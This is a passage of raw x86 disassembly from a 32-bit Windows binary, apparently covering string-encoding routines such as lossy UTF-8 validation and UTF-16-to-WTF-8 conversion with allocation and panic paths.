  40237c:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  40237f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402382:	e9 9c f7 ff ff       	jmp    0x401b23
  402387:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40238a:	89 c8                	mov    %ecx,%eax
  40238c:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40238f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402392:	50                   	push   %eax
  402393:	e8 18 f2 02 00       	call   0x4315b0
  402398:	83 c4 04             	add    $0x4,%esp
  40239b:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40239e:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4023a1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4023a4:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  4023a7:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4023aa:	e9 22 fc ff ff       	jmp    0x401fd1
  4023af:	89 ca                	mov    %ecx,%edx
  4023b1:	88 7d e0             	mov    %bh,-0x20(%ebp)
  4023b4:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4023bb:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4023be:	6a 02                	push   $0x2
  4023c0:	e8 eb f1 02 00       	call   0x4315b0
  4023c5:	83 c4 04             	add    $0x4,%esp
  4023c8:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4023cb:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4023ce:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4023d1:	8a 7d e0             	mov    -0x20(%ebp),%bh
  4023d4:	e9 e0 fd ff ff       	jmp    0x4021b9
  4023d9:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4023dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4023df:	f2 0f 10 45 bc       	movsd  -0x44(%ebp),%xmm0
  4023e4:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4023e7:	89 48 08             	mov    %ecx,0x8(%eax)
  4023ea:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  4023ee:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  4023f5:	83 c4 58             	add    $0x58,%esp
  4023f8:	5e                   	pop    %esi
  4023f9:	5f                   	pop    %edi
  4023fa:	5b                   	pop    %ebx
  4023fb:	5d                   	pop    %ebp
  4023fc:	c3                   	ret
  4023fd:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402404:	68 3c 33 43 00       	push   $0x43333c
  402409:	57                   	push   %edi
  40240a:	6a 00                	push   $0x0
  40240c:	ff 75 10             	push   0x10(%ebp)
  40240f:	56                   	push   %esi
  402410:	e8 fb f1 02 00       	call   0x431610
  402415:	83 c4 14             	add    $0x14,%esp
  402418:	eb 25                	jmp    0x40243f
  40241a:	b8 01 00 00 00       	mov    $0x1,%eax
  40241f:	e9 c2 f1 ff ff       	jmp    0x4015e6
  402424:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40242b:	68 4c 33 43 00       	push   $0x43334c
  402430:	8b 45 10             	mov    0x10(%ebp),%eax
  402433:	50                   	push   %eax
  402434:	57                   	push   %edi
  402435:	50                   	push   %eax
  402436:	56                   	push   %esi
  402437:	e8 d4 f1 02 00       	call   0x431610
  40243c:	83 c4 14             	add    $0x14,%esp
  40243f:	0f 0b                	ud2
  402441:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  402448:	00 00 00 
  40244b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  402450:	55                   	push   %ebp
  402451:	83 ec 14             	sub    $0x14,%esp
  402454:	83 c5 0c             	add    $0xc,%ebp
  402457:	83 7d bc 00          	cmpl   $0x0,-0x44(%ebp)
  40245b:	74 13                	je     0x402470
  40245d:	8b 75 c0             	mov    -0x40(%ebp),%esi
  402460:	ff 15 08 30 43 00    	call   *0x433008
  402466:	56                   	push   %esi
  402467:	6a 00                	push   $0x0
  402469:	50                   	push   %eax
  40246a:	ff 15 0c 30 43 00    	call   *0x43300c
  402470:	83 c4 14             	add    $0x14,%esp
  402473:	5d                   	pop    %ebp
  402474:	c3                   	ret
  402475:	cc                   	int3
  402476:	cc                   	int3
  402477:	cc                   	int3
  402478:	cc                   	int3
  402479:	cc                   	int3
  40247a:	cc                   	int3
  40247b:	cc                   	int3
  40247c:	cc                   	int3
  40247d:	cc                   	int3
  40247e:	cc                   	int3
  40247f:	cc                   	int3
  402480:	55                   	push   %ebp
  402481:	89 e5                	mov    %esp,%ebp
  402483:	53                   	push   %ebx
  402484:	57                   	push   %edi
  402485:	56                   	push   %esi
  402486:	83 ec 30             	sub    $0x30,%esp
  402489:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  40248c:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  402493:	c7 45 ec 30 31 40 00 	movl   $0x403130,-0x14(%ebp)
  40249a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40249e:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4024a1:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  4024a8:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4024ab:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  4024b2:	0f 84 c9 00 00 00    	je     0x402581
  4024b8:	8b 55 0c             	mov    0xc(%ebp),%edx
  4024bb:	8b 45 10             	mov    0x10(%ebp),%eax
  4024be:	31 ff                	xor    %edi,%edi
  4024c0:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  4024c3:	8d 4a 01             	lea    0x1(%edx),%ecx
  4024c6:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4024c9:	eb 1d                	jmp    0x4024e8
  4024cb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  4024d0:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4024d3:	89 ca                	mov    %ecx,%edx
  4024d5:	01 f7                	add    %esi,%edi
  4024d7:	31 c9                	xor    %ecx,%ecx
  4024d9:	39 da                	cmp    %ebx,%edx
  4024db:	0f 95 c1             	setne  %cl
  4024de:	01 d1                	add    %edx,%ecx
  4024e0:	39 da                	cmp    %ebx,%edx
  4024e2:	0f 84 99 00 00 00    	je     0x402581
  4024e8:	0f b6 1a             	movzbl (%edx),%ebx
  4024eb:	be 01 00 00 00       	mov    $0x1,%esi
  4024f0:	84 db                	test   %bl,%bl
  4024f2:	79 dc                	jns    0x4024d0
  4024f4:	80 fb e0             	cmp    $0xe0,%bl
  4024f7:	73 13                	jae    0x40250c
  4024f9:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4024fc:	31 d2                	xor    %edx,%edx
  4024fe:	be 02 00 00 00       	mov    $0x2,%esi
  402503:	39 d9                	cmp    %ebx,%ecx
  402505:	0f 95 c2             	setne  %dl
  402508:	01 ca                	add    %ecx,%edx
  40250a:	eb c9                	jmp    0x4024d5
  40250c:	80 fb ed             	cmp    $0xed,%bl
  40250f:	75 2e                	jne    0x40253f
  402511:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402514:	31 c0                	xor    %eax,%eax
  402516:	39 f1                	cmp    %esi,%ecx
  402518:	0f 95 c0             	setne  %al
  40251b:	31 d2                	xor    %edx,%edx
  40251d:	89 c3                	mov    %eax,%ebx
  40251f:	01 cb                	add    %ecx,%ebx
  402521:	39 f3                	cmp    %esi,%ebx
  402523:	0f 95 c2             	setne  %dl
  402526:	89 d6                	mov    %edx,%esi
  402528:	01 da                	add    %ebx,%edx
  40252a:	89 f3                	mov    %esi,%ebx
  40252c:	be 03 00 00 00       	mov    $0x3,%esi
  402531:	84 d8                	test   %bl,%al
  402533:	74 44                	je     0x402579
  402535:	80 39 9f             	cmpb   $0x9f,(%ecx)
  402538:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  40253b:	76 98                	jbe    0x4024d5
  40253d:	eb 6b                	jmp    0x4025aa
  40253f:	89 f8                	mov    %edi,%eax
  402541:	8b 7d e0             	mov    -0x20(%ebp),%edi
  402544:	31 d2                	xor    %edx,%edx
  402546:	be 03 00 00 00       	mov    $0x3,%esi
  40254b:	39 f9                	cmp    %edi,%ecx
  40254d:	0f 95 c2             	setne  %dl
  402550:	01 ca                	add    %ecx,%edx
  402552:	89 d1                	mov    %edx,%ecx
  402554:	31 d2                	xor    %edx,%edx
  402556:	39 f9                	cmp    %edi,%ecx
  402558:	0f 95 c2             	setne  %dl
  40255b:	01 ca                	add    %ecx,%edx
  40255d:	80 fb f0             	cmp    $0xf0,%bl
  402560:	72 0e                	jb     0x402570
  402562:	31 c9                	xor    %ecx,%ecx
  402564:	39 fa                	cmp    %edi,%edx
  402566:	be 04 00 00 00       	mov    $0x4,%esi
  40256b:	0f 95 c1             	setne  %cl
  40256e:	01 ca                	add    %ecx,%edx
  402570:	89 fb                	mov    %edi,%ebx
  402572:	89 c7                	mov    %eax,%edi
  402574:	e9 5c ff ff ff       	jmp    0x4024d5
  402579:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  40257c:	e9 54 ff ff ff       	jmp    0x4024d5
  402581:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402584:	8b 55 08             	mov    0x8(%ebp),%edx
  402587:	8b 45 10             	mov    0x10(%ebp),%eax
  40258a:	89 4a 04             	mov    %ecx,0x4(%edx)
  40258d:	89 42 08             	mov    %eax,0x8(%edx)
  402590:	c7 02 00 00 00 80    	movl   $0x80000000,(%edx)
  402596:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402599:	89 d0                	mov    %edx,%eax
  40259b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4025a2:	83 c4 30             	add    $0x30,%esp
  4025a5:	5e                   	pop    %esi
  4025a6:	5f                   	pop    %edi
  4025a7:	5b                   	pop    %ebx
  4025a8:	5d                   	pop    %ebp
  4025a9:	c3                   	ret
  4025aa:	8b 75 10             	mov    0x10(%ebp),%esi
  4025ad:	31 c0                	xor    %eax,%eax
  4025af:	85 f6                	test   %esi,%esi
  4025b1:	79 0e                	jns    0x4025c1
  4025b3:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4025ba:	56                   	push   %esi
  4025bb:	50                   	push   %eax
  4025bc:	e8 bd ee 02 00       	call   0x43147e
  4025c1:	89 7d cc             	mov    %edi,-0x34(%ebp)
  4025c4:	83 ec 0c             	sub    $0xc,%esp
  4025c7:	89 74 24 08          	mov    %esi,0x8(%esp)
  4025cb:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4025d2:	00 
  4025d3:	e8 e8 75 01 00       	call   0x419bc0
  4025d8:	83 c4 0c             	add    $0xc,%esp
  4025db:	85 c0                	test   %eax,%eax
  4025dd:	0f 84 ab 02 00 00    	je     0x40288e
  4025e3:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4025e6:	89 f7                	mov    %esi,%edi
  4025e8:	8b 75 cc             	mov    -0x34(%ebp),%esi
  4025eb:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4025ee:	29 f7                	sub    %esi,%edi
  4025f0:	0f 82 fd 01 00 00    	jb     0x4027f3
  4025f6:	56                   	push   %esi
  4025f7:	ff 75 0c             	push   0xc(%ebp)
  4025fa:	50                   	push   %eax
  4025fb:	89 c3                	mov    %eax,%ebx
  4025fd:	e8 0e 0d 02 00       	call   0x423310
  402602:	83 c4 0c             	add    $0xc,%esp
  402605:	83 ff 03             	cmp    $0x3,%edi
  402608:	89 f7                	mov    %esi,%edi
  40260a:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40260d:	0f 82 1a 02 00 00    	jb     0x40282d
  402613:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  402616:	89 da                	mov    %ebx,%edx
  402618:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40261b:	83 c7 03             	add    $0x3,%edi
  40261e:	c6 40 02 bd          	movb   $0xbd,0x2(%eax)
  402622:	66 c7 00 ef bf       	movw   $0xbfef,(%eax)
  402627:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40262a:	83 c1 03             	add    $0x3,%ecx
  40262d:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  402630:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  402633:	0f 87 d6 01 00 00    	ja     0x40280f
  402639:	0f 84 ac 01 00 00    	je     0x4027eb
  40263f:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402642:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402645:	8b 45 0c             	mov    0xc(%ebp),%eax
  402648:	8d 34 10             	lea    (%eax,%edx,1),%esi
  40264b:	8d 4c 10 01          	lea    0x1(%eax,%edx,1),%ecx
  40264f:	89 55 cc             	mov    %edx,-0x34(%ebp)
  402652:	89 f0                	mov    %esi,%eax
  402654:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402657:	eb 20                	jmp    0x402679
  402659:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402660:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402663:	89 c8                	mov    %ecx,%eax
  402665:	01 55 cc             	add    %edx,-0x34(%ebp)
  402668:	31 c9                	xor    %ecx,%ecx
  40266a:	39 f0                	cmp    %esi,%eax
  40266c:	0f 95 c1             	setne  %cl
  40266f:	01 c1                	add    %eax,%ecx
  402671:	39 f0                	cmp    %esi,%eax
  402673:	0f 84 2a 01 00 00    	je     0x4027a3
  402679:	0f b6 18             	movzbl (%eax),%ebx
  40267c:	ba 01 00 00 00       	mov    $0x1,%edx
  402681:	84 db                	test   %bl,%bl
  402683:	79 db                	jns    0x402660
  402685:	80 fb e0             	cmp    $0xe0,%bl
  402688:	73 13                	jae    0x40269d
  40268a:	8b 75 e0             	mov    -0x20(%ebp),%esi
  40268d:	31 c0                	xor    %eax,%eax
  40268f:	ba 02 00 00 00       	mov    $0x2,%edx
  402694:	39 f1                	cmp    %esi,%ecx
  402696:	0f 95 c0             	setne  %al
  402699:	01 c8                	add    %ecx,%eax
  40269b:	eb c8                	jmp    0x402665
  40269d:	31 d2                	xor    %edx,%edx
  40269f:	80 fb ed             	cmp    $0xed,%bl
  4026a2:	75 2e                	jne    0x4026d2
  4026a4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4026a7:	39 c1                	cmp    %eax,%ecx
  4026a9:	0f 95 c2             	setne  %dl
  4026ac:	89 d3                	mov    %edx,%ebx
  4026ae:	89 d6                	mov    %edx,%esi
  4026b0:	31 d2                	xor    %edx,%edx
  4026b2:	01 cb                	add    %ecx,%ebx
  4026b4:	39 c3                	cmp    %eax,%ebx
  4026b6:	0f 95 c2             	setne  %dl
  4026b9:	89 d0                	mov    %edx,%eax
  4026bb:	01 d8                	add    %ebx,%eax
  4026bd:	89 f3                	mov    %esi,%ebx
  4026bf:	84 d3                	test   %dl,%bl
  4026c1:	ba 03 00 00 00       	mov    $0x3,%edx
  4026c6:	74 3e                	je     0x402706
  4026c8:	80 39 9f             	cmpb   $0x9f,(%ecx)
  4026cb:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4026ce:	76 95                	jbe    0x402665
  4026d0:	eb 3c                	jmp    0x40270e
  4026d2:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4026d5:	39 f1                	cmp    %esi,%ecx
  4026d7:	0f 95 c2             	setne  %dl
  4026da:	31 c0                	xor    %eax,%eax
  4026dc:	01 ca                	add    %ecx,%edx
  4026de:	39 f2                	cmp    %esi,%edx
  4026e0:	0f 95 c0             	setne  %al
  4026e3:	01 d0                	add    %edx,%eax
  4026e5:	80 fb f0             	cmp    $0xf0,%bl
  4026e8:	ba 03 00 00 00       	mov    $0x3,%edx
  4026ed:	0f 82 72 ff ff ff    	jb     0x402665
  4026f3:	31 c9                	xor    %ecx,%ecx
  4026f5:	39 f0                	cmp    %esi,%eax
  4026f7:	ba 04 00 00 00       	mov    $0x4,%edx
  4026fc:	0f 95 c1             	setne  %cl
  4026ff:	01 c8                	add    %ecx,%eax
  402701:	e9 5f ff ff ff       	jmp    0x402665
  402706:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402709:	e9 57 ff ff ff       	jmp    0x402665
  40270e:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402711:	89 c6                	mov    %eax,%esi
  402713:	2b 75 dc             	sub    -0x24(%ebp),%esi
  402716:	0f 82 55 01 00 00    	jb     0x402871
  40271c:	3b 45 10             	cmp    0x10(%ebp),%eax
  40271f:	0f 87 4c 01 00 00    	ja     0x402871
  402725:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  402728:	89 d8                	mov    %ebx,%eax
  40272a:	29 f8                	sub    %edi,%eax
  40272c:	39 c6                	cmp    %eax,%esi
  40272e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402731:	77 29                	ja     0x40275c
  402733:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402736:	01 f8                	add    %edi,%eax
  402738:	56                   	push   %esi
  402739:	ff 75 c4             	push   -0x3c(%ebp)
  40273c:	50                   	push   %eax
  40273d:	e8 ce 0b 02 00       	call   0x423310
  402742:	83 c4 0c             	add    $0xc,%esp
  402745:	01 f7                	add    %esi,%edi
  402747:	29 fb                	sub    %edi,%ebx
  402749:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40274c:	83 fb 02             	cmp    $0x2,%ebx
  40274f:	76 31                	jbe    0x402782
  402751:	8b 55 c8             	mov    -0x38(%ebp),%edx
  402754:	8d 04 3a             	lea    (%edx,%edi,1),%eax
  402757:	e9 bc fe ff ff       	jmp    0x402618
  40275c:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402763:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  402766:	89 fa                	mov    %edi,%edx
  402768:	89 75 dc             	mov    %esi,-0x24(%ebp)
  40276b:	56                   	push   %esi
  40276c:	e8 3f ee 02 00       	call   0x4315b0
  402771:	83 c4 04             	add    $0x4,%esp
  402774:	8b 7d d8             	mov    -0x28(%ebp),%edi
  402777:	8b 5d d0             	mov    -0x30(%ebp),%ebx
  40277a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40277d:	8b 75 dc             	mov    -0x24(%ebp),%esi
  402780:	eb b1                	jmp    0x402733
  402782:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402789:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40278c:	89 fa                	mov    %edi,%edx
  40278e:	6a 03                	push   $0x3
  402790:	e8 1b ee 02 00       	call   0x4315b0
  402795:	83 c4 04             	add    $0x4,%esp
  402798:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40279b:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40279e:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4027a1:	eb ae                	jmp    0x402751
  4027a3:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4027a6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4027a9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4027ac:	2b 4d dc             	sub    -0x24(%ebp),%ecx
  4027af:	29 f8                	sub    %edi,%eax
  4027b1:	39 c1                	cmp    %eax,%ecx
  4027b3:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4027b6:	0f 87 93 00 00 00    	ja     0x40284f
  4027bc:	8b 45 0c             	mov    0xc(%ebp),%eax
  4027bf:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4027c2:	01 fa                	add    %edi,%edx
  4027c4:	03 45 dc             	add    -0x24(%ebp),%eax
  4027c7:	53                   	push   %ebx
  4027c8:	50                   	push   %eax
  4027c9:	52                   	push   %edx
  4027ca:	e8 41 0b 02 00       	call   0x423310
  4027cf:	83 c4 0c             	add    $0xc,%esp
  4027d2:	01 df                	add    %ebx,%edi
  4027d4:	8b 55 08             	mov    0x8(%ebp),%edx
  4027d7:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4027da:	f2 0f 10 45 d0       	movsd  -0x30(%ebp),%xmm0
  4027df:	89 7a 08             	mov    %edi,0x8(%edx)
  4027e2:	f2 0f 11 02          	movsd  %xmm0,(%edx)
  4027e6:	e9 ab fd ff ff       	jmp    0x402596
  4027eb:	8b 45 10             	mov    0x10(%ebp),%eax
  4027ee:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4027f1:	eb b3                	jmp    0x4027a6
  4027f3:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4027fa:	68 8c 33 43 00       	push   $0x43338c
  4027ff:	ff 75 10             	push   0x10(%ebp)
  402802:	56                   	push   %esi
  402803:	6a 00                	push   $0x0
  402805:	e8 86 ee 02 00       	call   0x431690
  40280a:	83 c4 10             	add    $0x10,%esp
  40280d:	eb 7d                	jmp    0x40288c
  40280f:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402816:	68 7c 32 43 00       	push   $0x43327c
  40281b:	8b 45 10             	mov    0x10(%ebp),%eax
  40281e:	50                   	push   %eax
  40281f:	50                   	push   %eax
  402820:	ff 75 dc             	push   -0x24(%ebp)
  402823:	e8 68 ee 02 00       	call   0x431690
  402828:	83 c4 10             	add    $0x10,%esp
  40282b:	eb 5f                	jmp    0x40288c
  40282d:	8b 55 cc             	mov    -0x34(%ebp),%edx
  402830:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402837:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40283a:	6a 03                	push   $0x3
  40283c:	e8 6f ed 02 00       	call   0x4315b0
  402841:	83 c4 04             	add    $0x4,%esp
  402844:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  402847:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40284a:	e9 c4 fd ff ff       	jmp    0x402613
  40284f:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402856:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  402859:	89 fa                	mov    %edi,%edx
  40285b:	ff 75 e0             	push   -0x20(%ebp)
  40285e:	e8 4d ed 02 00       	call   0x4315b0
  402863:	83 c4 04             	add    $0x4,%esp
  402866:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  402869:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40286c:	e9 4b ff ff ff       	jmp    0x4027bc
  402871:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402878:	68 7c 33 43 00       	push   $0x43337c
  40287d:	ff 75 10             	push   0x10(%ebp)
  402880:	50                   	push   %eax
  402881:	ff 75 dc             	push   -0x24(%ebp)
  402884:	e8 07 ee 02 00       	call   0x431690
  402889:	83 c4 10             	add    $0x10,%esp
  40288c:	0f 0b                	ud2
  40288e:	b8 01 00 00 00       	mov    $0x1,%eax
  402893:	e9 1b fd ff ff       	jmp    0x4025b3
  402898:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40289f:	00 
  4028a0:	55                   	push   %ebp
  4028a1:	83 ec 10             	sub    $0x10,%esp
  4028a4:	83 c5 0c             	add    $0xc,%ebp
  4028a7:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  4028ab:	74 13                	je     0x4028c0
  4028ad:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4028b0:	ff 15 08 30 43 00    	call   *0x433008
  4028b6:	56                   	push   %esi
  4028b7:	6a 00                	push   $0x0
  4028b9:	50                   	push   %eax
  4028ba:	ff 15 0c 30 43 00    	call   *0x43300c
  4028c0:	83 c4 10             	add    $0x10,%esp
  4028c3:	5d                   	pop    %ebp
  4028c4:	c3                   	ret
  4028c5:	cc                   	int3
  4028c6:	cc                   	int3
  4028c7:	cc                   	int3
  4028c8:	cc                   	int3
  4028c9:	cc                   	int3
  4028ca:	cc                   	int3
  4028cb:	cc                   	int3
  4028cc:	cc                   	int3
  4028cd:	cc                   	int3
  4028ce:	cc                   	int3
  4028cf:	cc                   	int3
  4028d0:	55                   	push   %ebp
  4028d1:	89 e5                	mov    %esp,%ebp
  4028d3:	53                   	push   %ebx
  4028d4:	57                   	push   %edi
  4028d5:	56                   	push   %esi
  4028d6:	83 ec 38             	sub    $0x38,%esp
  4028d9:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  4028dc:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4028e3:	c7 45 ec 40 31 40 00 	movl   $0x403140,-0x14(%ebp)
  4028ea:	8b 75 10             	mov    0x10(%ebp),%esi
  4028ed:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4028f0:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  4028f7:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4028fa:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402900:	31 c0                	xor    %eax,%eax
  402902:	85 f6                	test   %esi,%esi
  402904:	79 07                	jns    0x40290d
  402906:	56                   	push   %esi
  402907:	50                   	push   %eax
  402908:	e8 71 eb 02 00       	call   0x43147e
  40290d:	74 22                	je     0x402931
  40290f:	83 ec 0c             	sub    $0xc,%esp
  402912:	89 74 24 08          	mov    %esi,0x8(%esp)
  402916:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40291d:	00 
  40291e:	e8 9d 72 01 00       	call   0x419bc0
  402923:	83 c4 0c             	add    $0xc,%esp
  402926:	85 c0                	test   %eax,%eax
  402928:	75 0c                	jne    0x402936
  40292a:	b8 01 00 00 00       	mov    $0x1,%eax
  40292f:	eb d5                	jmp    0x402906
  402931:	b8 01 00 00 00       	mov    $0x1,%eax
  402936:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402939:	89 75 c8             	mov    %esi,-0x38(%ebp)
  40293c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40293f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402942:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  402949:	c6 45 d4 01          	movb   $0x1,-0x2c(%ebp)
  40294d:	8d 04 73             	lea    (%ebx,%esi,2),%eax
  402950:	31 f6                	xor    %esi,%esi
  402952:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402955:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  40295c:	00 00 00 
  40295f:	90                   	nop
  402960:	31 c0                	xor    %eax,%eax
  402962:	a8 01                	test   $0x1,%al
  402964:	75 1a                	jne    0x402980
  402966:	3b 5d c0             	cmp    -0x40(%ebp),%ebx
  402969:	0f 84 ec 01 00 00    	je     0x402b5b
  40296f:	0f b7 13             	movzwl (%ebx),%edx
  402972:	83 c3 02             	add    $0x2,%ebx
  402975:	eb 0f                	jmp    0x402986
  402977:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40297e:	00 00 
  402980:	0f b7 45 be          	movzwl -0x42(%ebp),%eax
  402984:	89 c2                	mov    %eax,%edx
  402986:	89 d0                	mov    %edx,%eax
  402988:	25 00 f8 00 00       	and    $0xf800,%eax
  40298d:	3d 00 d8 00 00       	cmp    $0xd800,%eax
  402992:	0f 85 b8 00 00 00    	jne    0x402a50
  402998:	0f b7 c2             	movzwl %dx,%eax
  40299b:	3d ff db 00 00       	cmp    $0xdbff,%eax
  4029a0:	77 30                	ja     0x4029d2
  4029a2:	3b 5d c0             	cmp    -0x40(%ebp),%ebx
  4029a5:	74 28                	je     0x4029cf
  4029a7:	0f b7 03             	movzwl (%ebx),%eax
  4029aa:	83 c3 02             	add    $0x2,%ebx
  4029ad:	89 c1                	mov    %eax,%ecx
  4029af:	81 c1 00 20 00 00    	add    $0x2000,%ecx
  4029b5:	0f b7 c9             	movzwl %cx,%ecx
  4029b8:	81 f9 00 fc 00 00    	cmp    $0xfc00,%ecx
  4029be:	0f 83 ac 00 00 00    	jae    0x402a70
  4029c4:	b1 01                	mov    $0x1,%cl
  4029c6:	66 89 45 be          	mov    %ax,-0x42(%ebp)
  4029ca:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4029cd:	eb 0a                	jmp    0x4029d9
  4029cf:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  4029d2:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4029d9:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  4029dd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4029e0:	29 f0                	sub    %esi,%eax
  4029e2:	83 f8 02             	cmp    $0x2,%eax
  4029e5:	76 37                	jbe    0x402a1e
  4029e7:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4029ea:	89 d0                	mov    %edx,%eax
  4029ec:	c1 ea 06             	shr    $0x6,%edx
  4029ef:	80 e2 3f             	and    $0x3f,%dl
  4029f2:	24 3f                	and    $0x3f,%al
  4029f4:	0c 80                	or     $0x80,%al
  4029f6:	80 ca 80             	or     $0x80,%dl
  4029f9:	c6 04 31 ed          	movb   $0xed,(%ecx,%esi,1)
  4029fd:	88 54 31 01          	mov    %dl,0x1(%ecx,%esi,1)
  402a01:	88 44 31 02          	mov    %al,0x2(%ecx,%esi,1)
  402a05:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402a08:	83 c6 03             	add    $0x3,%esi
  402a0b:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402a0e:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402a11:	a8 01                	test   $0x1,%al
  402a13:	0f 84 4d ff ff ff    	je     0x402966
  402a19:	e9 62 ff ff ff       	jmp    0x402980
  402a1e:	89 55 d8             	mov    %edx,-0x28(%ebp)
  402a21:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  402a24:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
